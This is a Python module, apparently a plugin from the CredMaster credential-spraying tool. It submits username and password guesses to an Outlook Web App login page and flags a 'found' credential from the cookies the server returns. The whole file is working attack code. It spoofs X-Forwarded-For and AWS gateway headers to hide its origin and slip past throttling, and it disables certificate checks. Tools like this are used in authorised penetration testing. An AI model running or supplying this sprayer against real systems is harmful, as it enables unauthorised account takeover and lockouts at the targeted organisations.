import datetime, requests
from requests_ntlm import HttpNtlmAuth
import utils.utils as utils
from credmaster import log_entry
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def owa_authenticate(url, username, password, useragent, pluginargs):

    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        '2fa_enabled': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
        'sourceip' : None,
        'throttled' : False,
        'error' : False,
        'output' : ""
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()


    ''' ** For some reason this header causes the request to fail with 400:
        "Content-Type": "text/xml"
    '''
    headers = {
        'User-Agent': useragent,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
        "X-My-X-Forwarded-For" : spoofed_ip
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    server = pluginargs['url']

    ''' from sprayowa '''
    """
    Check id credentials are valid against the target server
    :return: number of cookies set by server or 0. In case of successfull login, number of cookies will be > 1 !
    """
    if not('\\' in username) and not('@' in username):
        username = pluginargs['domain'] + "\\" + username


    payload = {'destination': server,
               'flags': 4,
               'forcedownlevel': 0,
               'username': username,
               'password': password,
               'passwordText': '',
               'isUtf8': 1}

    try:

        resp = requests.post(server, data=payload, headers=headers, verify=False, allow_redirects=False)

        num_cookies = 4

        if resp.status_code == 302:
            cookies = resp.cookies
            cookie_num = len(cookies)
            if cookie_num >= num_cookies:
                data_response['output'] = f"[+] Found credentials: {username}:{password}"
                data_response['success'] = True
            else:
                data_response['output'] = f"[-] Authentication failed: {username}:{password} (Invalid credentials)"
                data_response['success'] = False

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass


    return data_response

